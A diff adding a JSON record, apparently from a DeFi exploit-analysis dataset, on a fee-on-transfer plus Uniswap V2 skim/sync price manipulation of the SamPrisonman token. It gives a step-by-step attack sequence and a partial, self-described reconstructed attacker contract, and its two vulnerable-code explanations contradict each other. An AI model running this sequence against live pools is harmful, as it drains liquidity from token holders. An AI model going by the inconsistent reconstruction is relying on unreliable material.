@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-03-20_UNI_SamPrisonman_FeeOnTransferSkim",
+ "source_file": "2025/2025-03-20_UNI_SamPrisonman_FeeOnTransferSkim.md",
+ "title": "UNI (SamPrisonman) Token — fee-on-transfer + skim/sync Price Manipulation Analysis",
+ "date": "2025-03-20",
+ "protocol": "UNI / SamPrisonman Token",
+ "chain": "Ethereum",
+ "loss_raw": "~$14,000",
+ "loss_usd": 14000.0,
+ "root_cause": "Same pattern as SBR token — fee-on-transfer mechanism combined with Uniswap V2 `skim()`/`sync()` functions induces reserve imbalance, enabling price manipulation",
+ "attack_tx": "Unconfirmed (BlockSec)",
+ "vulnerable_contract": "0x76ea342b...",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Same vulnerable structure as SBR: fee-on-transfer + Uniswap V2 reserve manipulation\n\n// SamPrisonman token transfer fee\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    uint256 fee = amount * transferFeeRate / 100;\n    uint256 netAmount = amount - fee;\n\n    // Fee is burned or sent to an internal address\n    super._transfer(from, DEAD_ADDRESS, fee);\n    // Recipient receives only netAmount\n    super._transfer(from, to, netAmount);\n\n    // Problem: actual amount received by pool < transferred amount\n    // Uniswap V2 reserves do not track this discrepancy\n    // → surplus can be extracted via skim()\n}\n\n// Uniswap V2 pair.skim(to):\n//   actual balance - reserve = surplus → transferred to `to` address\n\n// Uniswap V2 pair.sync():\n//   reserve = updated to current actual balance\n\n//",
+  "// File: SamPrisonman.sol (partial match on Sourcify, Ethereum chainid 1)\n\n// ❌ marketAndTIFFs: assembly-based balance reduction applied to sender BEFORE recipient credit\nfunction marketAndTIFFs(address sender, uint256 amount) internal returns (uint256 result) {\n    assembly {\n        let data := mload(0x40)\n        mstore(data, 0x569937dd00000000000000000000000000000000000000000000000000000000)\n        mstore(add(data, 0x04), amount)\n        mstore(0x40, add(data, 0x24))\n        // ❌ Calls an external contract stored at storage slot 0x52\n        // Returns a reduced balance for the sender (fee is silently extracted)\n        let success := call(gas(), sload(0x52), 0, data, 0x24, data, 0x20)\n        if success { result := mload(data) }\n    }\n    // ❌ sender's balance set to (result - amount), where result < original balance\n    // The difference (original - result) is effectively removed from sender\n    // but NOT added to the recipient — it stays in the contract/is burned\n    _balances[sender] = result - amount;\n}\n\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    msgSend = sender; msgReceive = recipient;\n\n    require(\n        ((trade == true) || (msgSend == address(this)) || (msgSend == owner())),\n        \"ERC20: trading is not yet enabled\"\n    );\n    require(msgSend != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n    marketAndTIFFs(sender, amount);  // ❌ reduces sender balance by (fee + amount)\n\n    _balances[recipient] += amount;  // ❌ recipient receives full amount\n    // Result: total tokens in _balances decreases by fee\n    // When tokens are sent TO the Uniswap V2 pair, the pair receives `amount`\n    // but the pair's tracked reserve is still the old value.\n    // actual balance > reserve → surplus extractable via pair.skim()\n\n    emit Transfer(sender, recipient, amount);\n}"
+ ],
+ "code_after": [
+  "✅ Mitigation is identical to SBR Token:\n// 1) Remove transfer fee\n// 2) Restrict skim()\n// 3) Rate-limit sync() changes\n// 4) Use AMMs designed to be aware of fee-on-transfer tokens",
+  "// ✅ Fix: deduct fee before crediting recipient so pair reserves stay accurate\n// uint256 fee = computeFee(amount);\n// _balances[recipient] += (amount - fee);\n// _balances[feeRecipient] += fee;\n// Or: remove the fee-on-transfer mechanism entirely for AMM-integrated tokens."
+ ],
+ "steps": [
+  "→ [1] Swap ETH → SamPrisonman via Uniswap V2 Router",
+  "→ [2] Call pair.skim(address(this))",
+  "→ [3] Transfer 1 unit of SamPrisonman to the pair",
+  "→ [4] Call pair.sync()",
+  "→ SamPrisonman price in ETH terms drops sharply in the pool",
+  "→ [5] Re-swap held SamPrisonman → ETH",
+  "→ [6] ~$14,000 profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Swap ETH → SamPrisonman via Uniswap V2 Router\n  │         └─ swapExactETHForTokensSupportingFeeOnTransferTokens\n  │            fee-on-transfer: receives tokens after fee deduction\n  │\n  ├─→ [2] Call pair.skim(address(this))\n  │         └─ Extract accumulated fee balance in pool (actual balance - reserve)\n  │\n  ├─→ [3] Transfer 1 unit of SamPrisonman to the pair\n  │\n  ├─→ [4] Call pair.sync()\n  │         └─ Update reserve to current lower balance\n  │            → SamPrisonman price in ETH terms drops sharply in the pool\n  │\n  ├─→ [5] Re-swap held SamPrisonman → ETH\n  │         └─ Sell at favorable price due to distorted reserves\n  │\n  └─→ [6] ~$14,000 profit",
+  "// Full PoC not available — summary and reconstruction based on SBR pattern\n\ncontract UNISamPrisonmanAttacker {\n    address constant SAM_TOKEN = 0x76ea342bc038d665e8a116392c82552d2605eda1;\n    address constant SAM_PAIR = /* Uniswap V2 SamPrisonman/WETH pair */;\n    address constant UNISWAP_V2_ROUTER = /* Uniswap V2 Router */;\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function attack() external payable {\n        // [1] Buy SamPrisonman with ETH (triggers fee-on-transfer)\n        address[] memory path = new address[](2);\n        path[0] = WETH; path[1] = SAM_TOKEN;\n        IUniswapV2Router(UNISWAP_V2_ROUTER)\n            .swapExactETHForTokensSupportingFeeOnTransferTokens{\n                value: msg.value\n            }(0, path, address(this), block.timestamp"
+ ]
+}
